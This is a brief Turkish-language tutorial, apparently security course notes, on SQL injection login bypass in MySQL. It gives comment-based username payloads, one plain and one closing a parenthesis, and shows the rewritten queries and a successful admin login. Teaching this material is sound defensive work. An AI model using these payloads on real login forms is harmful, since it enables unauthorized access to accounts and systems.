# Using Comments

## Auth Bypass with Comments

MySQL sorgusuna yorum eklemek için -- veya # kullanılabilir.

!!! warning

    Yorum eklemek için -- kullanılacağı zaman ifadenin ardına ekstra bir boşluk eklenmelidir.

Kullanıcı adı kısmına aşağıdaki değeri girelim:

```sql title="Username"
admin'-- -
```

!!! tip

    İfadenin sonuna fazladan eklenen - karakteri -- sonrasında bulunan boşluğu gösterebilmek içindir.

Nihayetinde, asıl sorgu şu şekilde gözükecektir:

```sql title="Query"
SELECT * FROM logins WHERE username = 'admin'-- -' AND password = 'a';
```

Bu da aşağıdaki sorguya karşılık gelir:

```sql title="Query"
SELECT * FROM logins WHERE username = 'admin'
```

Bu sayede yanlış parola ile giriş yapabiliriz:

```output title="Output"
Login successful as user: admin
```

## Auth Bypass with Comments (Parenthesis)

SQL sorgusunda parantez karakterleri kullanılıyor olsun:

```sql title="Query"
SELECT * FROM logins WHERE (username = 'admin' AND id > 1) AND password = '0f359740bd1cda994f8b55330c86d845';
```

Parantez karakterleri hesaba katılmalıdır:

```sql title="Username"
admin')-- -
```

Nihayetinde, asıl sorgu şu şekilde gözükecektir:

```sql title="Query"
SELECT * FROM logins WHERE (username = 'admin')-- -' AND id > 1) AND password = '0f359740bd1cda994f8b55330c86d845';
```

Bu da aşağıdaki sorguya karşılık gelir:

```sql title="Query"
SELECT * FROM logins WHERE (username = 'admin')
```
